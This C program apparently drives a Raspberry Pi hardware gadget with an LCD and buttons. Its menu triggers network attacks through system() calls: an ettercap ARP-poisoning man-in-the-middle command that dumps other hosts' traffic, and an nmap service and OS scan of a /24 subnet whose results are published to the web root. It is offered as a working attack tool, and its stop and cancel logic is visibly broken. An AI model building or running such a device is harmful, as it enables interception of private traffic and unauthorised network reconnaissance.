//
//  main.c
//
//  Created by Bernardo Sequeiros on 21/04/16.
//  Copyright © 2016 Bernardo Sequeiros. All rights reserved.
//

#include <stdio.h>
#include <wiringPi.h>                                                         //include wiringpi
#include <mcp23017.h>                                                         //include mcp23017 control head file
#include <lcd.h>                                                              //include LCD control head file
#include <softPwm.h>                                                          //include PWM control head file

int pressedButton()
{

    
    int i;

    while(1){
        for(i = 108; i < 113; i++)
        {
            if(digitalRead(i))
                return i;
        }
    }
}

int main()
{
    long value=0;
    int rand_num;
    int value_blue;                                                       //the blue backlight brightness
    int value_red;                                                        //the red backlight brightness
    int value_green;                                                      //the green backlight brightness
    int display,i,count;
    wiringPiSetup();                                                      //init wiringPi
    mcp23017Setup (100, 0x20);                                            //init mcp23017 chip I2C address: 0x20,the first pin number: 100
    printf ("Raspberry Pi - MCP23017 Test\n");                            //print information
    for(i=0;i<16;i++)
        pinMode(100+i,OUTPUT);                                                //set pin 100 - 115 as output
    digitalWrite(101,0);                                                  //set pin 101 low voltage
    display=lcdInit(2,16,4,100,102,103,104,105,106,0,0,0,0);              //lcd init 2*16,4 bit control,use 100,101,102,103,104 pin as control pin
    lcdHome(display);                                                     //reset cursor
    lcdClear(display);                                                    //clear screen
    lcdPosition(display,0,0);                                             //set display location (0,0)
    lcdPuts(display,"Hello World");                                       //print string "Hello World"
    pinMode(0, OUTPUT);                                                   //set Raspberry pi pin 0 as output
    pinMode(2, OUTPUT);                                                   //set Raspberry Pi pin 2 as output
    pinMode(3, OUTPUT);                                                   //set Raspberry Pi pin 3 as output
    softPwmCreate (3, 50, 100);                                           //set soft PWM pin 3 PWM scale (0-100) original 50
    softPwmCreate (2, 50, 100);                                           //set soft PWM pin 2 PWM scale (0-100) original 50
    softPwmCreate (0, 50, 100);                                           //set soft PWM pin 0 PWM scale (0-100) original 50
    while(1)                                                                      //always display
    {
        lcdPosition(display,0,1);
        lcdPuts(display,"ARP Poisoning");

        
        int button = pressedButton();

        
        switch (button)
        {
            case 108:
                lcdPosition(display,0,0);
                lcdPuts(display,"Network will be poisoned.");
                lcdPosition(display,0,1);
                lcdPuts(display,"Are you sure? Other button to cancel");
                while(1){
                    button = pressedButton();
                    switch (button) {
                        case 108:
                            system("ettercap -Tq -w dump -M arp:remote // output");
                            while(1)
                            {
                                lcdPosition(display,0,0);
                                lcdPuts(display,"Press select button to stop");
                                button = pressedButton();
                                switch (button) {
                                    case 108:
                                        system("q");
                                        break;
                                    default:
                                        continue;
                                }
                                if(button == 108)
                                    break;
                            }
                            break;
                        default:
                            break;
                    }
                }
                break;
            case 111:
                lcdPosition(display,0,1);
                lcdPuts(display,"Re-scan with Nmap");
                while(1){
                    button = pressedButton();
                    switch (button) {
                            case 108:
                                system("nmap -oX /var/www/html/nmap-output.xml -sV -O 10.0.5.0/24");
                                system("xsltproc /var/www/html/nmap-output.xml -o /var/www/html/nmap-output.html");
                                break;
                            case 110:
                                break;
                    }
                    if(button == 110)
                        break;
                }
                break;
            default:
                break;
        }
    }
}